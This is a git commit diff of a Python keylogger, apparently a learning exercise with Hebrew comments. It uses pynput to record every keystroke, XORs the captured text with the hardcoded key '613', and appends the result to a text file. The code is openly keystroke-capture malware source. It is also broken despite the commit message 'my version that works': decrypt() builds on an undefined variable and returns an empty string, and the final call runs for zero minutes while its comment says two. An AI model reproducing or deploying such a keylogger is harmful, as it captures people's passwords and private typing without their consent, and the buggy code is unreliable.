eae665e11e52b47fb685c0678fd8575e81bf0f78
RafiKDev00 <kigrj1@gmail.com>
2025-02-11 12:51:19 +0200

    my version that works

--- test_1.py
+++ test_1.py
@@ -1,5 +1,6 @@
-
 from datetime import datetime
+from time import sleep
+import os
 from pynput import keyboard
 from collections import defaultdict
 import time
@@ -7,41 +8,48 @@ import threading
 
 
 class Key_loger:
-    def __init__(self):
-        self.press_char = defaultdict(list)
+    def __init__(self, time_to_run):
         self.listener = keyboard.Listener(on_press=self.on_press)
+        self.time_to_run = time_to_run
         self.listener.start()
-        self.stop_timer = threading.Timer(60, self.stop_after_one_minute)
-        self.stop_timer.start()
+        self.press_char = []
 
     def stop_after_one_minute(self):
+        start_time = time.time()
+        while time.time() - start_time < self.time_to_run * 60:
+            sleep(1)
         self.listener.stop()
-        return self.press_char
+        string = "".join(self.press_char)
+        return string
+
+
+        # self.listener.stop()
+
+    # def stop_after_one_minute(self):
+    #     string = "".join(self.press_char)
+    #     return string
 
     def on_press(self, key):
         """ מאזין להקשות מקשים ושומר אותן לפי זמן """
         try:
             formatted_date = datetime.now().strftime("%d/%m/%Y %H:%M")
             if hasattr(key, 'char') and key.char is not None:
-                self.press_char[formatted_date].append(key.char)
+                self.press_char.append(key.char)
             else:
-                self.press_char[formatted_date].append(key.name if hasattr(key, "name") else str(key))
+                self.press_char.append(key.name if hasattr(key, "name") else str(key))
         except Exception as e:
             print(f"שגיאה: {e}")
 
-        
+
 class Writer:
-    def __init__(self, data):
+    def __init__(self, data, file_name):
         self.data = data
-        self.file_name = "key_logger_non_encrypted_file.txt"
+        self.file_name = file_name
         self.write()
- 
+
     def write(self):
-        with open(self.file_name, "w") as f:  
+        with open(self.file_name, "a") as f:
             f.write(self.data)
-
-
-
 
 
 class EncryptorAndDecryptor:
@@ -52,45 +60,55 @@ class EncryptorAndDecryptor:
         self.key_word = "613"
 
     def encrypt(self):
-        string = ""
+        encrypted_string = ""
         key_length = len(self.key_word)
 
-        with open(self.decrypted_file_name, "r") as read_file:
-            text = read_file.read()  # Read full file content
+        # with open(self.decrypted_file_name, "r") as read_file:
+        #     text = read_file.read()  # Read full file content
 
-        # XOR each character with the corresponding key character (cycling through the key)
-        for i in range(len(text)):
-            string += chr(ord(text[i]) ^ ord(self.key_word[i % key_length]))  #
+        #do xor as cycle through Key
+        for i in range(len(self.data)):
+            encrypted_string += chr(ord(self.data[i]) ^ ord(self.key_word[i % key_length]))  #
 
-        with open(self.encrypted_file_name, "w") as f:  # Overwrite to avoid appending errors
-            f.write(string)
+        # with open(self.encrypted_file_name, "w") as f:  #remember overwrting
+        #    f.write(string)
+        return encrypted_string
 
-
-    def decrypt(self):
-        string = ""
+    def decrypt(self, encrypted_txt):
+        decrypted_string = ""
         key_length = len(self.key_word)
 
-        with open(self.encrypted_file_name, "r") as read_file:
-            encrypted_text = read_file.read()  # Read full encrypted content
+        # with open(self.encrypted_file_name, "r") as read_file:
+        #     encrypted_text = read_file.read()  # Read full encrypted content
 
-        # XOR each character with the corresponding key character (cycling through the key)
-        for i in range(len(encrypted_text)):
-            string += chr(ord(encrypted_text[i]) ^ ord(self.key_word[i % key_length]))  
+        #do xor as cycle through Key
+        for i in range(len(encrypted_txt)):
+            string += chr(ord(encrypted_txt[i]) ^ ord(self.key_word[i % key_length]))
 
-        with open(self.decrypted_file_name, "w") as f:  # Overwrite to restore original text
-            f.write(string)
+        return decrypted_string
+        # with open(self.decrypted_file_name, "w") as f:  # Overwrite to restore original text
+        #     f.write(string)
 
 
 class Manager:
     def __init__(self, time_to_run):
-       self.time_to_run = time_to_run # must be in minutes...it'll then iterate through this for 60 second intervals!
-       self.run_key_logger()
-    
-    def run_key_logger(self):
-        while self.time_to_run != 0:
-            kl = Key_loger()
-            ec = EncryptorAndDecryptor(kl)
-            w = Writer(kl)
-            time_to_run -= 1
+        self.time_to_run = time_to_run  # must be in minutes...it'll then iterate through this for 60 second intervals!
+        self.run_key_logger()
 
-           
+    def run_key_logger(self):
+        kl = Key_loger(self.time_to_run)
+        logged_data = kl.stop_after_one_minute() # iterates through one at a time
+
+        
+        # #encrypt and write encrypted data
+        encryptor = EncryptorAndDecryptor(logged_data)
+        encrypted_data = encryptor.encrypt()
+        # Writer(encrypted_data, encryptor.encrypted_file_name)
+
+        #decrypte + write decrypted data
+        decrypted_data = encryptor.decrypt(encrypted_data)
+        Writer(decrypted_data, encryptor.decrypted_file_name)
+
+
+# Run the key logger for 2 minute and save the encrypted and decrypted files
+mc = Manager(0)
